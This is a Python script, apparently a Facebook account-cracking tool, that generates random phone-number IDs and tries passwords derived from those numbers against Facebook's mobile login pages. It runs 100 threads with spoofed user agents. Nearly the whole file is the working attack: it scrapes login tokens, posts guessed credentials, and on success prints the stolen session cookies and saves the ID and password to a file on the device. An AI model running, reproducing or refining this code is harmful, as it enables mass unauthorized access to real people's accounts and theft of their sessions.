#-------𝗘𝗛𝗖 𝗖𝗬𝗕𝗘𝗥 𝟵𝟵 𝗛𝗔𝗖𝗞𝗜𝗡𝗚 
#-------𝟵𝟳𝟭𝟬𝟱𝟲𝟰𝟯𝟱𝟯𝟵𝟯𝟯
#-------𝟵𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳
#==========================➲
#!/usr/bin/python3
import os,re,sys,random,string,time
from os import system as EHC
try:
    import requests
except:
    os.system("pip install requests")
    import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import datetime 
from string import *
dateti=str(datetime.now()).split(" ")[0]
logo="""
\033[1;31m▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄      
\033[1;31m▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     
\033[1;31m▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌     
\033[1;31m▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     
\033[1;31m▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌     
\033[1;31m▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌     
\033[1;31m▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀ ▐░█▀▀▀▀█░█▀▀      
\033[1;31m▐░▌     ▐░▌  ▐░▌     ▐░▌  ▐░▌     ▐░▌       
\033[1;31m▐░▌      ▐░▌ ▐░▌      ▐░▌ ▐░▌      ▐░▌      
\033[1;31m▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌     
\033[1;31m▀         ▀  ▀         ▀  ▀         ▀
\033[38;5;46m═══════\033[33;1m══════════\x1b[38;5;196m════════\033[34;1m═══════𝗘𝗛𝗖
\033[34;1m✮⃝ MAHIN𝄟⃝\x1b[38;5;196m {𝟭}\033[38;5;46m\x1b[38;5;196m╔══➻〱𝗡𝗔𝗠𝗘\033[33;1m➽   \033[38;5;46mMAHIN
\033[34;1m✮⃝ MAHIN𝄟⃝\x1b[38;5;196m {𝟮}\033[38;5;46m\x1b[38;5;196m╚══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \x1b[38;5;196m𝟵𝟳𝟭𝟬𝟱𝟲𝟵𝟱𝟰𝟵𝟴𝟱𝟳
\033[34;1m✮⃝ MAHIN𝄟⃝\x1b[38;5;196m {𝟯}\033[38;5;46m\033[38;5;46m╔══➻〱𝗠𝗢𝗕𝗜𝗟𝗘\033[33;1m➽ \033[34;1m𝟵𝟳𝟭𝟬𝟱𝟲𝟰𝟯𝟱𝟯𝟵𝟯𝟯
\033[34;1m✮⃝ MAHIN𝄟⃝\x1b[38;5;196m {𝟰}\033[38;5;46m\033[38;5;46m╚══➻〱𝗥𝗔𝗡𝗗𝗢𝗠\033[33;1m➽ \033[33;1m𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟬𝟱
\033[34;1m✮⃝ MAHIN𝄟⃝\x1b[38;5;196m {𝟱}\033[38;5;46m\033[33;1m╔══➻〱𝗧𝗢𝗢𝗟𝗦\033[33;1m➽  \033[33;1mRRR KING
\033[34;1m✮⃝ MAHIN𝄟⃝\x1b[38;5;196m {𝟲}\033[38;5;46m\033[33;1m╚══➻〱𝗙𝗥𝗢𝗠\033[33;1m➽  \x1b[38;5;196m 𝗕𝗔𝗡𝗚𝗟𝗔𝗗𝗘𝗦𝗛"""

def line():
    print("—"*36)
def sykology():
    emran=[]
    EHC("clear")
    print(logo)
    print(" \033[38;5;46m════════════════════════════════════")
    print("\033[38;5;46m𝗦𝗜𝗠𝗘 𝗖𝗢𝗗𝗘〱\033[34;1m𝟬𝟭𝟴〱\033[37;1m𝟬𝟭𝟳〱\033[33;1m𝟬𝟭𝟵〱\x1b[38;5;196m𝟬𝟭𝟲〱\x1b[38;5;196m𝟬𝟭𝟱")
    print(" \033[38;5;46m════════════════════════════════════")
    print(" \033[38;5;46m════════════════════════════════════")
    ehc_code=input("\033[38;5;46m〱𝗖𝗛𝗢𝗜𝗖𝗘🌺")
    print(" \033[38;5;46m════════════════════════════════════")
    line()
    print(" \033[38;5;46m════════════════════════════════════")
    print("\033[38;5;46m〱𝗟𝗠𝗧〱\033[34;1m𝟭𝟬𝟬𝟬〱\033[37;1m𝟮𝟬𝟬𝟬〱\033[33;1m𝟯𝟬𝟬𝟬〱\x1b[38;5;196m𝟰𝟬𝟬𝟬")
    print(" \033[38;5;46m════════════════════════════════════")
    print(" \033[38;5;46m════════════════════════════════════")
    ehc_lim=int(input("\033[38;5;46m〱𝗖𝗛𝗢𝗜𝗖𝗘🌺"))
    print(" \033[38;5;46m════════════════════════════════════")
    line()
    for z in range(ehc_lim):
        co=''.join(random.choice(string.digits) for _ in range(5))
        emran.append(co)
    print(" \033[38;5;46m════════════════════════════════════")
    print(" \033[38;5;46mMAHIN𝟭➲〱{RRR}╔══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗠.}")
    print(" \033[38;5;46mMAHIN𝟮➲〱{RRR}╚══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗠-𝗕𝗔𝗦𝗜𝗖}")
    print(" \033[38;5;46mMAHIN𝟯➲〱{RRR}╔══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗙𝗥𝗘𝗘.}")
    print(" \033[38;5;46mMAHIN𝟰➲〱{RRR}╚══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗣.}")
    print(" \033[38;5;46mMAHIN𝟱➲〱{RRR}╔══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎{𝗫.}")
    print(" \033[38;5;46mMAHIN𝟲➲〱{RRR}╚══➻〱𝗨𝗣𝗗𝗔𝗧𝗘💎𝗙𝗨𝗖𝗞{𝗬𝗢𝗨}")
    print(" \033[38;5;46m════════════════════════════════════")
    line()
    gxd=input(" 〱𝗘𝗛𝗖〱𝗖𝗛𝗢𝗶𝗖𝗘 𝗨𝗣𝗗𝗔𝗧𝗘 𝗡𝗨𝗠𝗕𝗘𝗥:")
    if gxd in ["EMRAN1","M"]:
        fb="m"
        fb1="M1"
    elif gxd in ["EMRAN2","Mbasic"]:
        fb="mbasic"
        fb1="M2"
    elif gxd in ["EMRAN3","Free"]:
        fb="free"
        fb1="M3"
    elif gxd in ["EMRAN4","P"]:
        fb="p"
        fb1="M4"
    elif gxd in ["EMRAN5","X"]:
        fb="x"
        fb1="M5"
    else:
        fb="touch"
        fb1="M6"
    with ThreadPool(max_workers=100) as feel:
        EHC("clear")
        print(logo)
        tl=str(len(emran))
        print(" \033[38;5;46m════════════════════════════════════")
        print(f"\033[38;5;46m𝗙𝗕 𝗜𝗗 𝗦𝗔𝗩𝗘: /\033[38;5;47msdcard/\033[38;5;49mMAHIN-𝗢𝗞.𝘁𝘅𝘁") 
        print(f"\033[38;5;46m𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 𝗜𝗗\033[38;5;196m>> \033[38;5;49m{tl} \033[38;5;50m[{dateti}]") 
        print(" \033[38;5;46m════════════════════════════════════")
        line()
        for id in emran:
            uid=ehc_code+id
            pwx=[]
            pwx.append(uid[5:])#back 6
            pwx.append(uid[4:])#back 7
            pwx.append(uid[3:])#back 8
            pwx.append(uid[:6])#front 6
            pwx.append(uid[:7])#front 7
            pwx.append(uid[:8])#front 8
            pwx.append(uid)
            feel.submit(random_subb,uid,pwx,fb,fb1)
oks=[]
cps=[]
ugen=[]
loop=0
"""
try:
    prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
except:
    print(" [✓] INTERNET CONNECTION ERROR")
    sys.exit()
#open('.prox.txt','w').write(proxx)
pxx=open(".prox.txt","r").read().splitlines()
"""
for xd in range(50000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def random_subb(uid,pwx,fb,fb1):
    global oks,cps,ugen,loop,pxx
    sys.stdout.write(f"\r\033[38;5;46m[𝗘𝗠𝗥𝗔𝗡✅] [{fb1}] {loop}|{str(len(oks))}|0");sys.stdout.flush()
    session=requests.Session()
    try:
        for ps in pwx:
            free_fb = session.get(f'https://{fb}.facebook.com').text
            #prox=random.choice(pxx)
            uuu=random.choice(ugen)
            info={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            update= {"authority": f'{fb}.facebook.com',"method": 'POST',"scheme": 'https',"accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',"accept-encoding": 'gzip, deflate, br',"accept-language": 'en-US,en;q=1',"cache-control": 'no-cache, no-store, must-revalidate',"referer": f'https://{fb}.facebook.com/',"sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',"sec-ch-ua-mobile": '?0',"sec-ch-ua-platform": "Windows","sec-fetch-dest": 'document',"sec-fetch-mode": 'navigate',"sec-fetch-site": 'same-origin',"sec-fetch-user": '?1',"pragma": 'no-cache',"priority": 'u=1',"cross-origin-resource-policy": 'cross-origin',"upgrade-insecure-requests": '1',"user-agent": uuu,}
            session.post(url=f"https://{fb}.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",data=info,headers=update).text
            eehhcc=session.cookies.get_dict().keys()
            if "c_user" in eehhcc:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                sort=coki.split("sb=")[1]
                coki1=coki.split("1000")[1]
                xd="1000"+coki1[0:11]
                print(f"""
\033[33;1m𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╔══➻🌺\033[38;5;46m𝙉𝙐𝙈𝘽𝙀𝙍╔══➻💎\033[38;5;46m{uid} 
\033[33;1m𝙁𝗔𝘾𝙀𝘽𝙊𝙊𝙆╚══➻🌺\033[38;5;46m𝙋𝘼𝙎𝙎𝙒𝘿╚══➻💎\033[38;5;46m{ps}
\033[33;1m𝘾𝙊𝙊𝙆𝙀𝙎(𝙊𝙆✅)\033[38;5;46m{coki}
""")
                open("/sdcard/mahin-ok.txt","a").write(xd+"|"+ps+"\n")
                oks.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        time.sleep(4)
sykology()



